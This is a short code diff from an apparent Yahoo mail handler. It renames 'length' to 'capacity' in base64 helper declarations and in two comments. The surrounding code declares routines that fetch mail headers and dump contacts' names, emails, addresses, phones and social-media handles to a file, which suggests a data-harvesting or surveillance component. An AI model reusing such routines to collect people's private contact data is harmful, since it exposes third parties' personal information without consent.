@@ -11,8 +11,8 @@
 #include "Handler_Yahoo.h"
 
 
-extern char *base64_encodeY(const unsigned char *input, int length);
-extern unsigned char *base64_decodeY(const char *input, int length, int *outlen);
+extern char *base64_encodeY(const unsigned char *input, int capacity);
+extern unsigned char *base64_decodeY(const char *input, int capacity, int *outlen);
 
 extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 
@@ -990,7 +990,7 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 					if(!jHeader[i]->IsString())
 						continue;
 
-					//length of header
+					//capacity of header
 					dwSize = wcslen(jHeader[i]->AsString().c_str());
 					if(dwSize == 0)
 						continue;
@@ -3170,7 +3170,7 @@ DWORD AsciiBufToQP(LPWSTR lpBuffer, DWORD dwSize, LPWSTR* lpUTFBuf)
 		{
 			if ((dwLine == 73) && (dwWR > 0))
 			{
-				//if it's an encoded char, then write it exceeding the fixed length
+				//if it's an encoded char, then write it exceeding the fixed capacity
 				if(dwLen > 1)
 				{
 					memcpy((*lpUTFBuf)+(dwWR), &strUTF[j], ((dwLen-j)*sizeof(WCHAR)));
